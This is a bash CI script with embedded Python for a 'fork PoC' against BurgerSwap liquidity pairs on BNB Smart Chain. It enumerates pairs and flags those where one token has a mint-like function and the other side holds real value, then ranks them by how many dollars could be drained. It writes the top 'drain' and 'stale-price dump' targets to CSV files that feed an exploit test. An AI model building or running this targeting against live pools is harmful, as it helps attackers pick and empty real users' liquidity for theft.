#!/usr/bin/env bash
# BurgerSwap (BSC) — heavy CI job: full 922-pair enumeration + candidate export for the fork PoC.
# Read-only network calls (public BSC RPC + DefiLlama). No secrets written to files.
set -uo pipefail
cd "$(dirname "$0")/.."   # folder root

echo "[burgerswap] start $(date -u +%FT%TZ)"
python3 --version
python3 ci/enumerate.py
RC=$?
echo "[burgerswap] enumerate.py rc=$RC"
# Export PoC inputs from the enumeration (so forge test picks up live candidates)
python3 - <<'EOF'
import json, os
try:
    pairs = json.load(open("ci-out/pairs.json"))
except Exception as e:
    print("no pairs.json:", e); raise SystemExit(0)
os.makedirs("poc/test", exist_ok=True)
drain = []
for r in pairs:
    # candidate: one side has mint-like selector, other side has real value
    if r["mint0"] and r["usd_reserve"] >= 20 and r["usd_drain_if_inflatable"] >= 20:
        drain.append((r["pair"], r["token0"], r["token1"], r["sym0"], r["sym1"], r["usd_drain_if_inflatable"]))
    if r["mint1"] and r["usd_reserve"] >= 20 and r["usd_drain_if_inflatable"] >= 20:
        drain.append((r["pair"], r["token1"], r["token0"], r["sym1"], r["sym0"], r["usd_drain_if_inflatable"]))
drain.sort(key=lambda x: -x[5])
with open("poc/test/drain.csv", "w") as f:
    for p, mal, real, s0, s1, usd in drain[:40]:
        f.write(f"{p},{mal},{real},{s0},{s1}\n")
excess = sorted([r for r in pairs if r["usd_excess"] >= 1], key=lambda x: -x["usd_excess"])
with open("poc/test/excess.csv", "w") as f:
    for r in excess[:10]:
        f.write(f"{r['pair']},{r['sym0']},{r['sym1']},{r['usd_excess']}\n")
print("drain candidates:", len(drain), "excess pairs:", len(excess))
EOF
echo "[burgerswap] poc inputs written"
# second stage: quantitative stale-price dump model (needs pairs.json)
if [ -f ci-out/pairs.json ]; then
  python3 ci/pancake_arb.py || echo "[burgerswap] pancake_arb rc=$?"
fi
# export live dump targets for the fork PoC
python3 - <<'EOF'
import json, os
try:
    sd = json.load(open("ci-out/stale_dump.json"))
except Exception as e:
    print("no stale_dump.json:", e); raise SystemExit(0)
os.makedirs("poc/test", exist_ok=True)
with open("poc/test/dump_targets.csv", "w") as f:
    for r in sd[:10]:
        f.write(f"{r['pair']},{r['mal']},{r['real']},{int(r['x'])}\n")
print("dump targets written:", min(len(sd), 10))
EOF
ls -la ci-out/ poc/test/ 2>/dev/null || true
du -sh ci-out/* 2>/dev/null || true
echo "[burgerswap] end $(date -u +%FT%TZ)"
# always let the forge test step run; the enumeration RC is visible in the log
exit 0
